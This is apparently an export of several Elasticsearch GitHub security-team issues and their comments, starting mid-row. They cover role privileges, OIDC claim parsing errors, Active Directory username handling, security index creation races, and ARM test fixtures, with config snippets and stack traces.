I have already rasied a [PR](https://github.com/elastic/logstash/pull/10341) to align the documents (some documents mention to include the builtin_role, others mention to add both roles), but I believe that it's better to decide first what's the root cause of this and if `logstash_admin` role is missing a permission or not.

@jsvd is also aware of this.","Pinging @elastic/es-securityWhy does logstash central management need to hit the `/` endpoint in ES?
Is it just using that to test whether the node is available, or does it actually need data from that endpoint?Hitting this issue as well. 

Given that:
* The Logstash monitoring and management can communicate with different clusters
* Logstash monitoring uses a dedicated user for that purpose.

I suggest a new ""built-in user"" `logstash_management_ system` with the role `logstash_admin`(as required by the CPM). A better user name would be `logstash_admin_system` given the name of the role :)> Why does logstash central management need to hit the `/` endpoint in ES? Is it just using that to test whether the node is available, or does it actually need data from that endpoint?

@tvernum since its a payed feature it hits _xpack and needs `cluster:monitor/xpack/info` That still gives issues (reporting 403 but not much more info given default log settings) and giving it the monitoring role makes it work, unsure why it's hitting something else governed by the permissions given by the `monitor` role (ES 7.15)",no,":Security/Authorization,Team:Security,"
elastic/elasticsearch,317454290,"[Security] Reduce Index Privileges given to remote_monitoring_agent","*Original comment by @pickypg:*

Creating from Cloud issue: LINK REDACTED

The current privileges given to the remote monitoring agent (aka, the user needed for any HTTP Exporter talking to a secure cluster) are _more_ than it needs:

```yaml
remote_monitoring_agent:
  cluster:
    - manage_index_templates
    - manage_ingest_pipelines
    - monitor
  indices:
    - names:
      - .marvel-es-*
      - .monitoring-*
      privileges:
        - all
```

We should be explicit with the permissions (this is Cloud's non-built-in version, with `indices:admin/get` added):

```yaml
remote_monitoring_agent:
  cluster:
    - manage_index_templates
    - manage_ingest_pipelines
    - monitor
  indices:
    - names:
      - .marvel-es-*
      - .monitoring-*
      privileges:
        - indices:admin/create
        - indices:admin/get
        - indices:admin/mapping/put
        - indices:admin/mappings/fields/get
        - indices:admin/mappings/get
        - indices:admin/template/*
        - indices:data/write/bulk
```

We may be able to remove some of those permissions as well, and we can probably modify the BWC alias resource code to hit `GET .marvel-es-1-*/_aliases` instead of `GET .marvel-es-1-*?filter_path=*.aliases`.

",,no,">enhancement,:Data Management/Monitoring,:Security/Authorization,Team:Data Management,Team:Security,"
elastic/elasticsearch,488005758,"Better handling of `ResourceAlreadyExistsException` for security index","When the security index is not created and operation is being performed on the security index we prepare the index and then execute the operation. But in case we receive two parallel requests then there are two requests for creating the security index. One of them fails with `ResourceAlreadyExistsException` as the index has been created and then it immediately executes the operation assuming security index is available. This may not be true as the index has been created but not yet available (all primary shards not yet active, in case of security index it usually is 1), the request fails with different error depending on the operation being performed.

Discuss if this needs to be fixed and what the resolution looks like.
Options:
- do nothing and let it fail the operation, the error message is not intuitive and does not let user know why it failed.
- error out when `ResourceAlreadyExistsException` is thrown instead of continuing with the operation with a proper error message.
- check for the security index availability before invoking the operation by an exponential backoff and after no of retries fail with a proper error message.
- any other alternatives.","Pinging @elastic/es-securityWe discussed this some time ago, but didn't update the issue.

Part of the problem here is that we don't have any handling in the SecurityIndexManager for _Index exists, but is still initialising_.
So while it's more likely that this issue will come up following a `ResourceAlreadyExistsException`, it could technically happen in other code paths too.

There's a general problem that the SecurtyIndexManager has no strategy for  _We think there is probably a task running somewhere in the cluster that will get the security index into a ready state, but we don't know if/when it will complete_.

We _could_ build an internal queue of some sort of _tasks to run when the security index is available_, where each one has an expiry time (probably something like 5-10s or so, but that's pulled from nowhere) and then we'd execute those tasks when we get a cluster update that moves the security index into ""available"" state, and have a period timer to call the failure handler with some timeout exception if they reach their expiry.

That seems complex though, which is why we haven't done it. To date we've only seen reports of this from internal testing that access clusters in abnormal ways. We haven't had a report from a production cluster (which isn't to say it doesn't happen, just that we don't hear about it).

This may be related to this issue: https://github.com/elastic/elasticsearch/issues/65846

If there were a way to say ""wait for primary shard or timeout"", it could address this problem",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,1276835009,"ResourceWatcherService performs IO on main scheduler thread","The `ResourceWatcherService` runs all its scheduled actions on `SAME`:

https://github.com/elastic/elasticsearch/blob/0699c9351f1439e246d408fd6538deafde4087b6/server/src/main/java/org/elasticsearch/watcher/ResourceWatcherService.java#L97-L99

Typically these actions are `FileWatcher` instances which check a file for changes and process the file if changes are detected. We shouldn't be doing this on the main scheduler thread because IO can be quite slow. I saw some instances where some checks were taking a couple of _minutes_ each. I suggest setting up a separate scheduler for this service to avoid delaying other scheduled activity.

I'm labelling this as `:Security/Security` because we seem to use this most heavily in hot-reloading of security config, although the framework itself seems to belong to Watcher.","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,317447659,"Change security Setting objects to use fully qualified config key","*Original comment by @tvernum:*

From LINK REDACTED, in comments from @s1monw 
- LINK REDACTED
- LINK REDACTED

Currently all the security related settings in X-Pack are handled without their path context - e.g `""user_dn_templates""` in `LdapSessionFactory` is really `""xpack.security.authc.realms.{NAME-OF-REALM}.user_dn_templates""`

Since we have support for _affix_ settings, we can probably convert everything over to use fully qualified keys instead.

There will be challenges in some places - e.g. SSL settings are used in lots of different places, but `SSLConfigurationSettings` already handles some of that complexity.




","*Original comment by @s1monw:*

> Since we have support for affix settings, we can probably convert everything over to use fully qualified keys instead.

that would be awesome!",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317448480,"migrate tool throws a NPE when user exists without role","*Original comment by @PhaedrusTheGreek:*

Pretty easy to reproduce:

```
$ bin/x-pack/users useradd testguy
$ bin/x-pack/users useradd testguy2 -r admin
$ bin/x-pack/migrate native -U http://localhost:9200 -u elastic -p changeme
starting migration of users and roles...
importing users from [/Users/jay/workspace/elasticsearch-5.6.4/config/x-pack/users]...
found existing users: [logstash, logstash_system, elsearch_watcher, elastic, es_admin, kibanaadmin, kibana]
migrating user [testguy2]
{""user"":{""created"":true}}
migrating user [testguy]
Exception in thread ""main"" ElasticsearchException[failed to migrate user [testguy] with body: n/a]; nested: NullPointerException;
	at org.elasticsearch.xpack.security.authc.esnative.ESNativeRealmMigrateTool$MigrateUserOrRoles.importUsers(ESNativeRealmMigrateTool.java:289)
	at org.elasticsearch.xpack.security.authc.esnative.ESNativeRealmMigrateTool$MigrateUserOrRoles.execute(ESNativeRealmMigrateTool.java:143)
	at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:70)
	at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134)
	at org.elasticsearch.cli.MultiCommand.execute(MultiCommand.java:69)
	at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134)
	at org.elasticsearch.cli.Command.main(Command.java:90)
	at org.elasticsearch.xpack.security.authc.esnative.ESNativeRealmMigrateTool.main(ESNativeRealmMigrateTool.java:91)
Caused by: java.lang.NullPointerException
	at org.elasticsearch.xpack.security.authc.esnative.ESNativeRealmMigrateTool$MigrateUserOrRoles.createUserJson(ESNativeRealmMigrateTool.java:240)
	at org.elasticsearch.xpack.security.authc.esnative.ESNativeRealmMigrateTool$MigrateUserOrRoles.importUsers(ESNativeRealmMigrateTool.java:284)
	... 7 more
```

",,no,">bug,help wanted,:Security/Authentication,Team:Security,"
elastic/elasticsearch,844231854,"Replace scroll with PIT and search_after for iterating documents in the security index","In security code, we use scroll in many places to iterate through entity documents, including users, roles, role mappings, api keys, tokens etc. Scroll is [no longer recommended](https://www.elastic.co/guide/en/elasticsearch/reference/7.12/paginate-search-results.html#scroll-search-results) for deep pagination. It also has a node wide limit on how many scroll can be open at the same time. We should replace it with [PIT](https://www.elastic.co/guide/en/elasticsearch/reference/7.12/point-in-time-api.html) + [search_after](https://www.elastic.co/guide/en/elasticsearch/reference/7.12/paginate-search-results.html#search-after) which is the current best practice.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317450208,"Ability to disable/enable roles","*Original comment by @epixa:*

Since we can't delete built-in roles and we can't determine if any users actually have a given role, it would be helpful if we could _disable_ roles.  This would have the same effect as deleting the role as far as authorization is concerned, but the action could be undone by enabling the role again.

The specific use case I have in mind is for Kibana.  We include a kibana_user role by default that cannot be deleted and that grants access to the underlying .kibana index.  This works fine for as long as Kibana has no security of its own and relies entirely on Elasticsearch for this, but having that role available means that we cannot build any custom security within Kibana around anything that touches .kibana.

As a result, for things like Kibana Spaces, we've discussed creating a new kibana index entirely to store ""secure"" objects whereas the original .kibana index would store ""insecure"" objects, but this is a crappy overall experience and adds an unnecessary operational burden for users.  Instead, we'd prefer that enabling Kibana Spaces (and other potential security features) result in the kibana_user role being disabled.

I have no opinions about restricting this to non-superuser users.","*Original comment by @clintongormley:*

Wouldn't we just remove the `kibana_user` role in this case?  The `kibana` user would be the only one with access to that index.*Original comment by @clintongormley:*

Also, if we disable the role, then it wouldn't be useful for the `kibana` user either.*Original comment by @jaymode:*

The `kibana` user uses the `kibana_system` role. We could add an option to not add the `kibana_user` role; but I prefer it being there and disabled since it still remains a reserved name and a user cannot create a native role with this name.*Original comment by @skearns64:*

@epixa - Are you sure that we want/need to change the definition of, or disable the `kibana_user` role when an admin enables workspaces (they will think of it as just creating their first non-default workspace)? That seems unintuitive to me. 

If we are making the choice to not use per-user ES-based security for protecting access to individual workspaces, that means Kibana is solely responsible for securing access to kibana saved objects, settings, etc, then why not have that be the case all the time? We could just change the definition of `kibana_user` to remove rw access to `.kibana`, and leverage the planned custom privilege definitions on roles LINK REDACTED to define  access to the default kibana workspace?

One of the reasons that we chose to make roles like `kibana_user` reserved/not-user-editable role, was that we could make changes to it's definition as necessary. 

*Original comment by @epixa:*

@skearns64 That's a fair question.  I'd love to ditch the role entirely, but I don't think that's reasonable in a minor release.  One issue that does come to mind is that a small number of people do use document level security for the kibana index to try to workaround our lack of RBAC, but that isn't possible with this spaces model.  I ultimately think spaces itself will be a better alternative for these users than dls, but they'll need to manually set up the relevant spaces when they remove dls, so that shouldn't just break on upgrade if we can avoid it.Is this feature implemented or still waiting to be implemented?",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1001971257,"[Meta] API Key Improvements","This is a meta issue for potential improvements to API Keys.

### Proposed
- https://github.com/elastic/elasticsearch/issues/70702
- https://github.com/elastic/elasticsearch/issues/54789
- https://github.com/elastic/elasticsearch/issues/77160
- https://github.com/elastic/elasticsearch/issues/70306
- https://github.com/elastic/elasticsearch/issues/69779
- https://github.com/elastic/elasticsearch/issues/69777
- https://github.com/elastic/elasticsearch/issues/67390
- https://github.com/elastic/elasticsearch/issues/67311
- https://github.com/elastic/elasticsearch/issues/65658
- https://github.com/elastic/elasticsearch/issues/59304
- https://github.com/elastic/elasticsearch/issues/54391
- https://github.com/elastic/elasticsearch/issues/51910
- https://github.com/elastic/elasticsearch/issues/52244
- https://github.com/elastic/elasticsearch/issues/47629

### Done (or WIP)
- https://github.com/elastic/elasticsearch/pull/76801
- https://github.com/elastic/elasticsearch/issues/48182
- https://github.com/elastic/elasticsearch/issues/50235
- https://github.com/elastic/elasticsearch/issues/47759
- https://github.com/elastic/elasticsearch/issues/48716
- https://github.com/elastic/elasticsearch/issues/49106
- https://github.com/elastic/elasticsearch/issues/58088","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,1304663344,"Allow OIDC usage over http","### Description

### Background

Elasticsearch requires TLS connections in order to enable some security feature like [Tokens for OIDC](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-create-api-key.html#security-api-create-api-key-desc).
This is important to guarantee that sensitive information is properly protected.

However, there are scenarios where encryption is managed outside of Elasticsearch.
Notable examples are [service mesh](https://en.wikipedia.org/wiki/Service_mesh) or [reverse proxy](https://en.wikipedia.org/wiki/Reverse_proxy) software that are in front of the cluster, handling all incoming communication with the REST endpoint.

###  Description
#### Goal
Allow service mesh and reverse proxy environments to use Elasticsearch OIDC/Tokens in scenarios where a clear-text connection between the service and Elasticsearch is used.



#### Proposal
Allow to relax the TLS bootstrap checks to make OIDC/Tokens available when TLS is not enabled. 


#### Other background Discussion:

https://github.com/dexidp/dex/issues/1593

https://github.com/elastic/elasticsearch/issues/61458","Pinging @elastic/es-security (Team:Security)This is a duplicate of https://github.com/elastic/elasticsearch/issues/81817. But I am going to close #81817 since this issue here is just for OAuth2 tokens while the other one has a mix of tokens and API keys and API keys no longer have the TLS restriction.",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,605429623,"bug on OpenID connect: java.lang.ClassCastException when the users claims do contain JSON","<!-- Bug report -->

**Elasticsearch version** (`bin/elasticsearch --version`): 7.6.1 

**Plugins installed**: []

**JVM version** (`java -version`): 1.8.0_242

**OS version** (`uname -a` if on a Unix-like system): RHEL 7.7 (exact version 3.10.0-1062.12.1.el7.x86_64)

**Description of the problem including expected versus actual behavior**: 
When using OpenID connect method, some claims can contain JSON objects in JSON lists. This is especially desirable in real world applications, when having rights to multiple ressources (eg, multiple elastic instances).  While it [isn't strictly part of the OpenID standard](https://openid.net/specs/openid-connect-core-1_0.html#IndividualClaimsRequests), many companies are using this format to transmit users permissions.

For example, a claim can have the following format : 
```""user_authorization"":[{""resource"":""myElasticInstance"",""permissions"":[{""name"":""SUPERUSER"",""constraints"":[]}]}],```

ElasticSearch does not handle the JSON object ```{""ressource"": ...}```, and thus throw an error.

**Current behavior:** 
A java.lang.ClassCastException is trigered

**Expected behavior:** 
The ""permission"" field is mapped to the roles of the user (via role mapping or automatically)

The logs (see below) should provide a relevant explanation of the issue

**Steps to reproduce**:

 1. Install an OpenAM instance (or any OpenID server). Store the permissions in the JSON format.
 2.  Configure a basic OpenID authentication in elasticsearch.yml : 
```
logger.org.elasticsearch.xpack.security.authc.oidc: ""TRACE""
xpack.security.authc.realms.oidc.oidc1:
      rp.client_id: ""11111111-1111-1111-1111-111111111111""
      rp.response_type: code
      rp.requested_scopes: [""openid"",""profile"",""myElasticInstance.KibanaAccess""]
      rp.redirect_uri: ""https://kibanaURL/api/security/oidc/callback""
      op.issuer: ""https://opURL/oauth2""
      op.authorization_endpoint: ""https://opURL/oauth2/authorize""
      ssl.certificate_authorities: [""sslkeys/ca-bundle.crt""]
      op.token_endpoint: ""https://opURL/oauth2/access_token""
      op.jwkset_path: ""https://opURL/oauth2/jwk_uri""
      op.userinfo_endpoint: ""https://opURL/oauth2/userinfo""
      op.endsession_endpoint: ""https://opURL/oauth2/logout""
      rp.post_logout_redirect_uri: ""https://kibanaURL/logged_out""
      claims.principal: ""sub""
      claims.groups: ""user_authorization""
      claims.name: ""name""
      claims.mail: ""mail""
```
3. Try to get authentiated on kibana.
4. View your logs and see a  java.lang.ClassCastException 

The problem seems to come [from this part of the code](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/oidc/OpenIdConnectRealm.java#L460-L476). Not sure what's the best way to fix that through...

**Provide logs (if relevant)**:
```
2020-04-23T11:26:32,779][TRACE][o.e.x.s.a.o.OpenIdConnectAuthenticator] [elastic-node-0] Successfully retrieved user information: [
{
""sub"":""myname@mycompany.com"",
""mail"":""myname@mycompany.com"",
""auth_level"":""L2"",
""origin_network"":""LAN"",
""rc_local_sigle"":""MyWonderful\/And\/Amazing\/Department"",
""first_name"":""MyFirstName"",
""preferred_language"":""EN"",
""last_name"":""myLastName"", 
""user_authorization"":[{""resource"":""myElasticInstance"",""permissions"":[{""name"":""SUPERUSER"",""constraints"":[]}]}],
""name"":""MyFirstName MyLastName"",
""family_name"":""MyLastName""
}
]
[2020-04-23T11:26:32,779][WARN][o.e.x.s.a.AuthenticationService] [elastic-node-0] An error occurred while attempting to authenticate [<OIDC Token>] against realm [oidc1]
java.lang.ClassCastException: class net.minidev.json.JSONObject cannot be cast to class java.lang.String (net.minidev.json.JSONObject is in unnamed module of loader java.net.FactoryURLClassLoader @7e4d2287; java.lang.String is in module java.base of loader 'bootstrap')
        at java.util.stream.ReferencePipeline$2$1.accept(ReferencePipeline.java:176) ~[?:?]
        at java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1621) ~[?:?]
        at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:484) ~[?:?]
        at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:474) ~[?:?]
        at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:913) ~[?:?]
        at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[?:?]
        at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:578) ~[?:?]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectRealm$ClaimParser.lambda$forSetting$2(OpenIdConnectRealm.java:480) ~[?:?]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectRealm$ClaimParser.getClaimValues(OpenIdConnectRealm.java:403) ~[?:?]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectRealm.buildUserFromClaims(OpenIdConnectRealm.java:228) ~[?:?]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectRealm.lambda$authenticate$0(OpenIdConnectRealm.java:168) ~[?:?]
        at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63) [elasticsearch-7.6.1.jar:7.6.1]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator.handleUserinfoResponse(OpenIdConnectAuthenticator.java:411) [x-pack-security-7.6.1.jar:7.6.1]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator.access$700(OpenIdConnectAuthenticator.java:122) [x-pack-security-7.6.1.jar:7.6.1]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator$1.completed(OpenIdConnectAuthenticator.java:364) [x-pack-security-7.6.1.jar:7.6.1]
        at org.elasticsearch.xpack.security.authc.oidc.OpenIdConnectAuthenticator$1.completed(OpenIdConnectAuthenticator.java:361) [x-pack-security-7.6.1.jar:7.6.1]
        at org.apache.http.concurrent.BasicFuture.completed(BasicFuture.java:122) [httpcore-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.client.DefaultClientExchangeHandlerImpl.responseCompleted(DefaultClientExchangeHandlerImpl.java:181) [httpasyncclient-4.1.4.jar:4.1.4]
        at org.apache.http.nio.protocol.HttpAsyncRequestExecutor.processResponse(HttpAsyncRequestExecutor.java:448) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.nio.protocol.HttpAsyncRequestExecutor.inputReady(HttpAsyncRequestExecutor.java:338) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.DefaultNHttpClientConnection.consumeInput(DefaultNHttpClientConnection.java:265) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.client.InternalIODispatch.onInputReady(InternalIODispatch.java:81) [httpasyncclient-4.1.4.jar:4.1.4]
        at org.apache.http.impl.nio.client.InternalIODispatch.onInputReady(InternalIODispatch.java:39) [httpasyncclient-4.1.4.jar:4.1.4]
        at org.apache.http.impl.nio.reactor.AbstractIODispatch.inputReady(AbstractIODispatch.java:121) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.reactor.BaseIOReactor.readable(BaseIOReactor.java:162) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.reactor.AbstractIOReactor.processEvent(AbstractIOReactor.java:337) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.reactor.AbstractIOReactor.processEvents(AbstractIOReactor.java:315) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.reactor.AbstractIOReactor.execute(AbstractIOReactor.java:276) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.reactor.BaseIOReactor.execute(BaseIOReactor.java:104) [httpcore-nio-4.4.12.jar:4.4.12]
        at org.apache.http.impl.nio.reactor.AbstractMultiworkerIOReactor$Worker.run(AbstractMultiworkerIOReactor.java:591) [httpcore-nio-4.4.12.jar:4.4.12]
        at java.lang.Thread.run(Thread.java:830) [?:?]
```
","Pinging @elastic/es-security (:Security/Authentication)Thanks for the feedback @Augustin-FL, we appreciate the real world use case and insights. 

The way we deal with the values we map from `claims.groups` means that there is an implicit assumption that this is a list of strings that will become the list of `groups` that the elasticsearch user has (and will be used for role mapping etc. ) 

We could potentially look into handling JSON Objects for this but I believe it should still be up to the administrator to configure the claims mapping accordingly as there is no specific way to deduce what should be consumed from a JSON object.

i.e. if you configure 

```
      claims.groups: ""user_authorization""
```

and `user_authorization` is 
```
""user_authorization"":[{""resource"":""myElasticInstance"",""permissions"":[{""name"":""SUPERUSER"",""constraints"":[]}]}],
```

what _exactly_ in that object defines the groups that the elasticsearch user should get? Since this is not part of any standard, it should fall to the administrator to correctly configure. I'm thinking that the parsing of the JSON Object should not be guessed or deduced, but explicitly configured. We could allow that the `claims.groups` can get a value that is a pointer to a nested JSON field that itself needs to be a string or array ( as is the current constraint ) . That would allow your OP to use JSON objects and you could configure your realm with something like
```
      claims.groups: ""user_authorization.resource:myElasticInstance.permissions.name""
```

I'm not certain how well this could be implemented in a generic way that is usable/configurable and could fit a generic use case, but we could take a look at some point. 

Given that this is the first time such a requirement comes up, I don't think we can prioritize any work towards it now, but we can keep this issue as reference!
In the meantime, could you also open an issue with ForgeRock and see if it is possible to configure this in the OP side so as to release the name of the permissions for the resource (RP) that made the authorization request as a separate claim ? ",no,":Security/Authentication,team-discuss,Team:Security,"
elastic/elasticsearch,794311745,"Active directory realm - support usernames that contain `@` and are not a Upn","Our Active Directory realm has 3 `ADAuthenticator` s ( `DefaultADAuthenticator`, `DownLevelADAuthenticator`, `UpnADAuthenticator` ) and the logic for selecting one of the 3 depends on the format of the username that is used by the authenticating user and boils down to

https://github.com/elastic/elasticsearch/blob/d9bc9774a85d89ba22633c80452b2a981aafb705/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/ldap/ActiveDirectorySessionFactory.java#L200-L208

In that, we make an implicit assumption on behalf of the administrator that no other attribute than `userPrincipalName` that both:

- Contains an `@`
- can be used as username for the authenticating user in an  AD realm.

We have `user_search.upn_filter` that could help from a first look, but `UpnADAuthenticator` attempts to do an LDAP Bind operation with whatever was passed as a username, and if this is not a Upn, that bind would fail. 

This is the first time it comes up that I remember of, but I can't see why we shouldn't support another attribute that contains an `@` ( I'll use `mail` as an example - even though email addresses are really bad for primary identifiers, just bear with me - ) as the username when authenticating to AD. 

","Pinging @elastic/es-security (Team:Security)",no,":Security/Authentication,team-discuss,Team:Security,"
elastic/elasticsearch,1128205105,"[Doc] document xpack.http.ssl.certificate_authorities behaviour","Watcher [documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/notification-settings.html#_pem_encoded_files_4l) doesn't clarify the following behaviour for trusted SSL/TLS certificates settings (e.g. `xpack.http.ssl.certificate_authorities`):
* by default, when trusted CAs are not explicitly configured, we fall back to trusting what JVM trusts, i.e. to a set of public CAs shipped with JDK
* when trusted CAs are explicitly configured, public CAs shipped with JDK are not included automatically

If Watcher happens to reach out to SSL/TLS endpoints using both private and public CAs, it is required to include both private and public CAs explicitly in configuration (e.g. `xpack.http.ssl.certificate_authorities`).","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">docs,:Security/TLS,Team:Docs,Team:Security,"
elastic/elasticsearch,317447486,"[License] elasticsearch - log when new license is applied","*Original comment by @jpcarey:*

When a new license is applied to elasticsearch, nothing is logged.

Here is what kibana logs when a new license is applied:
`log   [21:51:21.931] [info][license][xpack] Imported changed license information from Elasticsearch: mode: platinum | status: active | expiry date: 2017-02-01T16:59:59-07:00`

",,no,">enhancement,:Security/License,Team:Security,"
elastic/elasticsearch,851834158,"Replace existing identity provider test fixtures with ones that support aarch64","The `:x-pack:test:idp-fixture` project relies on a couple of Docker images that only support amd64 architecture, and therefore cannot be run on ARM. Specifically the `unicon/shibboleth-idp` and `c2id/c2id-server` images. We should look into finding alternatives here that support aarch64 so we aren't losing coverage on that platform.","Pinging @elastic/es-delivery (Team:Delivery)Pinging @elastic/es-security (Team:Security)I reached out to unicorn about updating their shibboleth-idp image and pretty confident they will not be updating their docker image. The good news is that the docker configuration is open source and there are a few forks, so we don't need to start from scratch to build an arm64 compatible image. The bad news is none of the images work out of the box so additional effort is needed for us to create an image, support arm64, and then update to the latest version. 


Some issues:

The shibboleth nexus repo seems to have issue, but this link seems to have similar (same ?) downloads
https://build.shibboleth.net/maven/releases

https://shibboleth.net/downloads/identity-provider/$idp_version appears to be missing, but it is availble at https://shibboleth.net/downloads/identity-provider/archive/archive/$idp_version

`http://central.maven.org` is no more and replaced with `https://repo.maven.apache.org`

Simply bumping up jetty versions does not seem to work, but https://github.com/winstonhong/Shibboleth-SAML-IdP-and-SP/blob/master/shibboleth-idp-dockerized/Dockerfile is an example of a newer jetty version

Simply bumping the idp version in the Dockerfile does not seem to work but https://github.com/CSCfi/shibboleth-idp-dockerized/blob/master/Dockerfile has an example of a newer (4.x) idp

https://github.com/winstonhong/Shibboleth-SAML-IdP-and-SP/blob/master/shibboleth-idp-dockerized/ is the closest to working out of the box, but our tests (./gradlew :x-pack:qa:saml-idp-tests:javaRestTest --info) fail during the SSL handshake.

We can build from source located here : git clone https://git.shibboleth.net/git/java-identity-provider.git with Java11 and newer version of maven. However, we shouldn't need to due to https://shibboleth.net/downloads/identity-provider/archive/archive/$idp_version

The main blocker to getting the unicorn image to build is 

```
DOWNLOAD: https://raw.githubusercontent.com/eclipse/jetty.project/master/jetty-server/src/test/config/etc/keystore?id=master to ${jetty.base}/etc/keystore
java.io.IOException: URL GET Failure [404/Not Found] on https://raw.githubusercontent.com/eclipse/jetty.project/master/jetty-server/src/test/config/etc/keystore?id=master
	at org.eclipse.jetty.start.fileinits.UriFileInitializer.download(UriFileInitializer.java:79)
	at org.eclipse.jetty.start.fileinits.UriFileInitializer.init(UriFileInitializer.java:60)
	at org.eclipse.jetty.start.BaseBuilder.processFileResource(BaseBuilder.java:283)
	at org.eclipse.jetty.start.BaseBuilder.processFileResources(BaseBuilder.java:375)
	at org.eclipse.jetty.start.BaseBuilder.build(BaseBuilder.java:239)
	at org.eclipse.jetty.start.Main.start(Main.java:406)
	at org.eclipse.jetty.start.Main.main(Main.java:76)
```
which is logged here:  https://github.com/eclipse/jetty.project/issues/2138
however, I don't see any easy work around that since that is referenced (i think ) [here](https://github.com/eclipse/jetty.project/commit/36c7fe8d4286647a183cc92092245c8ca1a3af83#diff-ecb3ca48adbfa33c49e7ebab69c2e5a53c67516c29569dd0129e75c5900661daL12), and not sure how to configure jetty 9.3.27 (especially via a docker image) to use a specific key store and it appears that jetty 9.4 has more changes that make this a bit more complex. I believe the keystore can be found [here](https://github.com/eclipse/jetty.project/blob/jetty-9.3.27.v20190418/jetty-server/src/test/config/etc/keystore) and dowloaded from https://github.com/eclipse/jetty.project/raw/jetty-9.3.27.v20190418/jetty-server/src/test/config/etc/keystore but not sure how to get the image to use that path. 
> The bad news is none of the images work out of the box so additional effort is needed for us to create an image, support arm64

Realistically the only difference between x86 and arm images should be the included JRE. Everything else should be identical. So typically you'd be starting from a base JDK image, which if they are multi-arch, should actually just work transparently. So when building the fixture on arm it'd use the arm base image and x86 for intel.

It might be worth pointing out here that he issue with this is less about missing test coverage on ARM and more about local development. Essentially as it is, you cannot run these tests on an M1 Mac, which is what _all_ Elastic developers will eventually be using and many already are. This means troubleshooting or developing these tests requires a) keeping  intel-based hardware on hand, b) spinning up a vm or c) relying on the commit/push/pr-check feedback loop which is quite slow.Success ! kinda ...

I forked the Unicorn repo https://github.com/jakelandis/shibboleth-idp-dockerized, and figured out the missing keystore config/download https://github.com/jakelandis/shibboleth-idp-dockerized/compare/7f8b92b4319dc7bfb6bb011fe37198170efaa667...master  I need to clean up the image build (I was throwing stuff at the wall to see what stuck) support arm64, and eventually update the versions...but that all seems reasonable now.

The tests pass on my x86 box with the custom built docker image. > https://github.com/elastic/elasticsearch/issues/71378#issuecomment-1226627341

FWIW, we shoudln't need to go so far as to build/deploy these images anywhere. We can just stick the Dockerfile alongside the test fixture and configure docker compose to build it rather than pull an image. It's perhaps slightly less efficient but it's certainly simpler.

Again, for amd64 support it should be jsut a matter of ensure we using a multi-arch base image. In this case in the ""build just in time"" scenario I describe above, on ARM it should ""just work"" as when you build the Docker imge locally, it'll use the correct base image architecture automatically.> Again, for amd64 support it should be jsut a matter of ensure we using a multi-arch base image. In this case in the ""build just in time"" scenario I describe above, on ARM it should ""just work"" as when you build the Docker imge locally, it'll use the correct base image architecture automatically.

We may have to fiddle with the current Dockerfile you have. It's currently downloading a JDK separately as oppossed to just using a baked JDK base image. That may be fine but we'd have to adapt the `wget` bit to download the aritifact for the current architecture.

[Here](https://github.com/elastic/elasticsearch/blob/cb70dac01609fc4865343cc0c6514b837129092e/distribution/docker/src/docker/Dockerfile#L58) is an example of how we do this for the Elasticsearch docker image.",no,":Delivery/Build,:Security/Authentication,Team:Security,Team:Delivery,"
elastic/elasticsearch,317447527,"Document FLS syntax for excluding fields","*Original comment by @clintongormley:*

LINK REDACTED introduced the ability to grant access to matching fields `except` ...

This is not documented: https://www.elastic.co/guide/en/x-pack/current/security-api-roles.html

","*Original comment by @tvernum:*

It's documented in LINK REDACTED but we should add an example to the API page and link to the FLS/DLS page for details.[docs issue triage]",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,931695195,"[DOCS] Integrate Fleet + Agent TLS setup into Stack docs","The Observability team recently added docs for [Encrypting traffic in a self-managed cluster](https://www.elastic.co/guide/en/fleet/7.x/secure-connections.html#generate-fleet-server-certs) for Fleet and Agent. This documentation should be integrated into the docs for securing the Elastic Stack, probably as a replacement for [configuring Metricbeat](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-basic-setup-https.html#configure-beats-security). 

